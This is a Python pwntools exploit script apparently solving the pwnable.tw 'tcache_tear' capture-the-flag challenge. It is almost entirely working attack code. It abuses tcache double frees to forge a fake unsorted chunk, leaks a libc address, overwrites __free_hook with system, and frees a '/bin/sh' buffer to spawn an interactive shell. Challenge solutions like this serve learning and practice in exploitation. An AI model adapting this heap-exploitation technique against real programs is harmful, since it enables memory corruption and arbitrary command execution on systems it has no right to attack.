from pwn import *
context.log_level='DEBUG'
if  args['REMOTE']:
    p=remote('chall.pwnable.tw', 10207)
    elf=ELF('./tcache_tear')
    libc=ELF('./libc.so')
else:
    p=process('./tcache_tear')
    elf=ELF('./tcache_tear')
    libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')


name_addr=0x602050 #name header start

def add(size,content):
    p.recvuntil(':')
    p.sendline('1')
    p.recvuntil('Size:')
    p.sendline(str(size))
    p.recvuntil('Data:')
    p.sendline(str(content))
    log.info('add '+str(size)+': '+str(content))
    
def free():
    p.recvuntil(':')
    p.sendline('2')
    log.info('free')
    
def show():
    p.recvuntil(':')
    p.sendline('3')
    p.recvuntil("Name :")

def name():
    p.recvuntil(':')
    p.sendline('happy')


name()
#use tcache dup tech to modify data

#build unsorted chunks
add(0x70,'0- tcache')
free() #
free() # double free now, to get a chunk at name's next chunk address
#consider name's unsorted chunk's size is 0x500(including header)
add(0x70,p64(name_addr+0x500)) #modify fk
add(0x70,'happy')        #vicitim chunks(fk points to name next chunk)
#now tcache seems empty
payload=p64(0)+p64(0x21)+p64(0)+p64(0)+p64(0)+p64(0x21)    ##overwrite bk size to 0x20
add(0x70,payload)        #modify name's next chunk

add(0x60,"1- tcache")
free()
free() #double free again
add(0x60,p64(name_addr))
add(0x60,"happy")
payload=p64(0)+p64(0x501)+p64(0)*5+p64(name_addr+0x10) # make name's fake chunk unsorted chunk,bypass check
add(0x60,payload) #get name chunk and 

free()
show()
libc_addr=u64(p.recv(8))-0x3ebca0
log.success('libc_addr:'+str(hex(libc_addr)))
#gdb.attach(p)
#p.interactive()


#write free_hook
free_hook_addr=libc_addr+libc.symbols['__free_hook']
system_addr=libc_addr+libc.symbols['system']
add(0x40,"happy")
free()
free() #double free again
add(0x40,p64(free_hook_addr))
add(0x40,"happy")
add(0x40,p64(system_addr)) #overwrite on the fk(free_hook_addr)

#get_shell
add(0x18,"/bin/sh\x00")  #heap pointer (point to /bin/sh string)
free()
p.interactive()
